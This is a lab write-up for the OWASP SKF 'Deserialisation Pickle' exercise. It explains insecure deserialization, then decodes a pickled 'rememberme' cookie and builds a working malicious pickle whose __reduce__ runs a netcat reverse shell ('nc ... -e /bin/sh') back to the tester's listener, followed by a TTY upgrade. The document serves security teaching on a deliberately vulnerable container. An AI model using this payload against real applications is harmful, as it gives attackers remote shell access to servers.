---
title: "OWASP SKF Labs | KBID XXX - Deserialisation Pickle | Write-up"
date: 2020-07-15
aliases:
    - insec-des
---

The [OWASP Top Ten 2017](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/) lists [A8:2017-Insecure Deserialization](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization.html) as one of the **Top Ten** most critical security risks to web applications. This article aims at explaining the risk posed by a similar vulnerability and a typical attack vector against it, by hands-on approach.

## Introduction
Before understanding a vulnerability or exploiting a functionality in an application, the first thing that should be done is to understand the core concepts behind the working of that application. So let's begin with that.

![1](/images/87548927-cfc97000-c6ca-11ea-9db0-8baf4624f35e.png)

According to the [OWASP Cheat Sheet Series](https://owasp.org/www-project-cheat-sheets/),
> **Serialization** is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications.

and,

> **Deserialization** is the reverse of that process, taking data structured from some format, and rebuilding it into an object.

In layman terms, an application might be using user defined data types, or what is more popularly known as classes. The running instances of these are often known as objects. For an instance, a class `user` may have `username` and `password` as two data members. An object `owasp` is defined with `username=owaspskf` and `password=p455w0rd`. This application may need to save these details somewhere so that in the future, the user `owasp` can login and get authenticated. This might be done by saving these details in a local file, database or even some remote database over the network. In that case, the object must be converted or encoded into a format that can be easily transmitted or saved. This is known as **Serialization**. When the application needs to fetch the object back, it just performs the reverse operation which is known as **Deserialization**.

### Where's the catch?
It's indeed a very interesting approach to make data persist, by converting it into a flexible form and then later converting it back when needed. But what if this conversion method is known to some bad actor? In that case, if the application tends to get the serialized data as an input from either GET or POST requests and there are no integrity checks for the object, someone can simply serialize some malicious code and try to inject it which can even lead to an RCE. Don't believe it? Let's do it!

## OWASP SKF Labs : KBID XXX - Deserialisation Pickle
### Setting up the lab.
[OWASP Security Knowledge Framework](https://owasp.org/www-project-security-knowledge-framework/) is an open source security knowledge-base including manageable projects with checklists and best practice code examples in multiple programming languages showing how to prevent hackers gaining access and running exploits on an application. It simply enables developers to integrate secure coding and testing in the SDLC. The project also provides many hands-on labs in the form of Docker images to help improve our verification skills.

One such lab is **KBID XXX - Deserialisation Pickle**. To set it up, Docker must be installed. You may refer to [this](https://gist.github.com/thirdbyte/dc02f129cd748e52e8475c88247b1812) post if you want a quick introduction to Docker. Provided Docker is already installed, run the following to pull the lab image:
```
$ docker pull blabla1337/owasp-skf-lab:des-pickle-2
```

![2](/images/87548934-d1933380-c6ca-11ea-86f7-b527d42b2c3a.png)

Now, we need to run this image.
```
$ docker run --rm -ti -p 5000:5000 blabla1337/owasp-skf-lab:des-pickle-2
```

![3](/images/87548938-d22bca00-c6ca-11ea-9435-cfe66fa2c738.png)

The lab will be up and running at http://0.0.0.0:5000 as you can see below:

![4](/images/87548940-d2c46080-c6ca-11ea-980e-7adf1898c0be.png)

You'll also be needing [Burpsuite](https://portswigger.net/burp/communitydownload) for this. So make sure you have configured your **Mozilla Firefox** browser with the proxy to get the interception done. Also ensure that **Python3** is installed.

### Understanding the Application
We'll start by getting a new user registered. For the purpose of this demonstration, we are using:

username=owaspskf & password=p455w0rd

Let's turn the Burpsuite's interceptor on and login with the credentials we created and the 'Remember me' checkbox checked.

![5](/images/87548944-d35cf700-c6ca-11ea-88ca-adeb6f9a03f9.png)

We can see the `username` and `password` in the POST request and also the `rememberme` parameter with the value `on`. Nothing interesting so far. Let's hit 'Forward'.

![6](/images/87548946-d3f58d80-c6ca-11ea-8902-260e80b70aaa.png)

This surely hints us that there is an **Insecure Deserialization** vulnerability that will lead to an RCE (...remote shell!). Let's click 'Home' and see where it takes us.

![7](/images/87548950-d48e2400-c6ca-11ea-9d75-3a26247fde50.png)

Since we checked the 'Remember me' option, we can see a Cookie in the POST request with `rememberme=` field and some base64 encoded data as value. Let's move 'Forward'.

![8](/images/87548951-d526ba80-c6ca-11ea-981a-ce5d474c52ff.png)

We are back at the login page. Let's try hitting 'Submit Button' without any credentials and see if we are actually being remembered.

![9](/images/87548955-d5bf5100-c6ca-11ea-82cd-3dd2fddff11c.png)

We can observe that there are no values in the `username` and `password` parameters. But since, the `rememberme=` field of the Cookie is already set, this should probably...

![10](/images/87548959-d657e780-c6ca-11ea-9422-fc5562afa852.png)

...log us in. And there we go. We have already gotten the parameter to target. For sure, the user as an object is being serialized, further being encoded into a base64 string and saved in the `rememberme=` field of the Cookie in the browser. This same data is then sent back to the server during a login without credentials, where the base64 gets decoded and then deserialized to get the `username` and `password`. We still lack one thing i.e the method being used to serialize the data. Unless or until we do not know what technology stack is running in the backend, we can not be certain about the serialization method and hence can not generate a payload to inject in the POST request.

Luckily, we have an amazing tool in our arsenal named [WhatWeb](https://github.com/urbanadventurer/WhatWeb) whose primary goal is to identify a website. A simple scan yielded the following result:
```
$ whatweb 0.0.0.0:5000
```
![11](/images/87548962-d6f07e00-c6ca-11ea-97a2-23462ada0d20.png)

We can now conclude that this lab uses **Python** and the most popular Python module to serialize data is **pickle**.

From Wikipedia:
> The pickle module implements binary protocols for serializing and de-serializing a Python object structure. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy.

### Confirming the Serialization Method
We'll now keep the serialized base64 string handy and write a simple python script to unpickle it. If it gets unpickled (or deserialized) successfully, that means we are right at this part that pickle is being used.

Serialized base64 encoded string:
```
gANjX19tYWluX18KdXNyCnEAKYFxAX1xAihYCAAAAHVzZXJuYW1lcQNYCAAAAG93YXNwc2tmcQRYCAAAAHBhc3N3b3JkcQVYCAAAAHA0NTV3MHJkcQZ1Yi4=
```

Let's create a file named, `deserialize.py` with the following code:
```
import pickle, base64
rememberme = input("rememberme= ")
serialdata = base64.b64decode(rememberme)
deserialdata = pickle.loads(serialdata)
print(desrialdata.__class__)
```

The code is very simple to understand. The bas64 encoded string will be input into the `rememberme` variable in the run-time, which will be decoded and stored in `serialdata` and then deserialized by `pickle` and stored in `deserialdata`. Then the script tries to fetch the class name from the deserialized object. Pretty smooth!

Let's run this python script with:
```
$ python3 deserialize.py
```

![12](/images/87548965-d821ab00-c6ca-11ea-8e6a-ab9306562d7f.png)

Oops! The script failed? Not really. We wanted to extract the name of the class and we already got that in the error i.e `usr`. Now, when we know that the object belongs to the class `usr`, let's take our script to the second level and extract the data members of this class.
```
import pickle, base64
class usr(object):
     pass
deserialdata = usr()
rememberme = input("rememberme= ")
serialdata = base64.b64decode(rememberme)
deserialdata = pickle.loads(serialdata)
print(dir(deserialdata))
```

We just added a class `usr` and made `deserialdata` an object of it. The `dir()` function returns all properties and methods of the specified object, without the values. This means that we'll get the data members too. So let's just run the script again.
```
$ python3 deserialize.py
```

![13](/images/87549539-934a4400-c6cb-11ea-9d05-e397c9285059.png)

We can observe the data members - `username` and `password` - along with all the default properties and methods. This takes us to the last step of our deserialization script. We just need to print out the values of these two data members. For that modify the script as below:
```
import pickle, base64
class usr(object):
     pass
deserialdata = usr()
rememberme = input("rememberme= ")
serialdata = base64.b64decode(rememberme)
deserialdata = pickle.loads(serialdata)
print(deserialdata.username)
print(deserialdata.password)
```

And for the last time...
```
$ python3 deserialize.py
```

![14](/images/87549541-947b7100-c6cb-11ea-9845-6e27b3d0d053.png)

There we have the deserialized object with the values. Everything we did so far was just to confirm that our assumption that this lab uses `pickle` module for serialization and deserialization, is true. Although, it was very obvious from the name of the lab, it doesn't happen in real life scenarios. It was important to cover this phase to eliminate any assumptions.

### Exploiting the Insecurity
The only thing left is to generate a serialized base64 encoded string that triggers RCE when it gets deserialized on the application server. Then we'll simply replace it with the string in the `rememberme=` field of the Cookie in the POST request. Let's get that root!

We need to write another script in **Python** to generate the payload as a serailized base64 encoded string. Create a new file, named `payload.py` with the following code:
```
import pickle, base64,os
lhost=input("LHOST: ")
lport=input("LPORT: ")
class payload(object):
  def __reduce__(self):
    return (os.system,(f"nc -nv {lhost} {lport} -e /bin/sh",))
deserialpayload = payload()
serialpayload = pickle.dumps(deserialpayload)
rememberme = base64.b64encode(serialpayload)
print(rememberme)
```

Again, this script is also very easy to understand just like the previous one. A class `payload` is defined which returns a system call that actually just executes netcat to connect to our host machine's terminal session where we'll be listening on the same IP(`lhost`) and Port(`lport`) that we we'll input into the script. An object `deserialpayload` is defined from this class which is then serialized and stored in `serialpayload` which is further encoded with base64 and stored in `rememberme` and get's printed.

Upon executing...
```
$ python3 payload.py
```

...we get the the final string for injection as shown below:

![15](/images/87548969-d8ba4180-c6ca-11ea-8ffc-206da19bc6fb.png)

Note the `LHOST` input which is just the IPv4 address of the host machine. Do not enter 127.0.0.1 as that will look for a netcat listener in the Docker container.

Now we simply need to start a netcat listener on the host machine by executing...
```
$ nc -lp 1337
```

![16](/images/87548972-d952d800-c6ca-11ea-81b1-a99ef63f5d10.png)

Let's fire up Burpsuite again, set the intercept on, visit http://0.0.0.0:5000/login and replace `rememberme=` value with the payload string we generated.

![17](/images/87548974-d952d800-c6ca-11ea-95c0-d5aa241b12ff.png)

We'll hit 'Forward' and get back to the netcat listener to try some commands and see if we get the connection.

![18](/images/87548979-d9eb6e80-c6ca-11ea-9f0c-12b8dad7e5b0.png)

And there we go! But hey, wait. This doesn't seem like a fancy shell. Let's try to spawn the good old TTY. In the connected netcat session, execute:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![19](/images/87548981-da840500-c6ca-11ea-91d5-7f25779aff40.png)

This spawns a typical TTY shell.

Hope you like this post. See ya till the next time!
